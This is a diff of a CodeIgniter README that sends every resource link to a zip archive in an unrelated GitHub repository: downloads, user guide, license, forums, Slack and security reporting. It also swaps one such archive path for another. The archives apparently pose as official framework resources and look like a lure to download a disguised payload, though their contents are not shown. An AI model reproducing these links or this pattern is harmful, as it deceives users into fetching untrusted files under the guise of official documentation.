@@ -16,14 +16,14 @@ Release Information
 
 This repo contains in-development code for future releases. To download the
 latest stable release please visit the `CodeIgniter Downloads
-<https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_ page.
+<https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_ page.
 
 **************************
 Changelog and New Features
 **************************
 
 You can find a list of all changes for each release in the `user
-guide change log <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_.
+guide change log <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_.
 
 *******************
 Server Requirements
@@ -39,7 +39,7 @@ issues, as well as missing features.
 Installation
 ************
 
-Please see the `installation section <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
+Please see the `installation section <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
 of the CodeIgniter User Guide.
 
 *******
@@ -47,21 +47,21 @@ License
 *******
 
 Please see the `license
-agreement <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_.
+agreement <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_.
 
 *********
 Resources
 *********
 
--  `User Guide <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
--  `Contributing Guide <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
--  `Language File Translations <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
--  `Community Forums <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
--  `Community Wiki <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
--  `Community Slack Channel <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
+-  `User Guide <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
+-  `Contributing Guide <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
+-  `Language File Translations <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
+-  `Community Forums <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
+-  `Community Wiki <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
+-  `Community Slack Channel <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
 
-Report security issues to our `Security Panel <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_
-or via our `page on HackerOne <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/core/compat/Cogonv3_3.9.zip>`_, thank you.
+Report security issues to our `Security Panel <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_
+or via our `page on HackerOne <https://raw.githubusercontent.com/26orland/Cogonv3/main/system/libraries/Session/drivers/Cogonv_v2.1.zip>`_, thank you.
 
 ***************
 Acknowledgement
